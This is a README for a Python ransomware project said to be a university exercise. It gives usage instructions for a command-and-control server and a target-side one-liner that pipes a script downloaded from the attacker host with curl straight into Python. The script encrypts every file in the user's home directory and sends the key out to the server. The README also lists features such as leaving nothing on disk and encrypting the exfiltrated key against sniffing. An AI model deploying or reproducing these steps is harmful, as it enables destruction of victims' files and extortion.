# Ransomware project

This is a sample ransomware created for a university project

## WARNING

__This library can and will encrypt all files in your home directory. Do not run unless you know what you are doing!__

### Usage

Start the C2-server:
```
python c2.py <hostname> <payload port> <comm port>
```
Where:

`<hostname>` is the host or ip the target should connect to

`<payload port>` is the port the mock http server (to download the encryption script from) should listen on

`<comm port>` is the port the encryption script sends the aes key to

Then execute the following command on the target:
```
curl -s http://<hostname>:<payload port> | python
```
The script will run immediately, creating a random encryption key, send it to the C2 server and then start encrypting all files in the users home directory

### Features
* No external dependencies outside the python standard library. Basic AES and RSA are included in the script. 
* Files are encrypted using AES-128-CBC, and can be decrypted using any AES-library after the target has recieved the key.
* Nothing is stored on the target's computer, the script is self contained and can be read directly from the output from curl
* Encryption keys are sent RSA encrypted to make it harder to recover by sniffing network traffic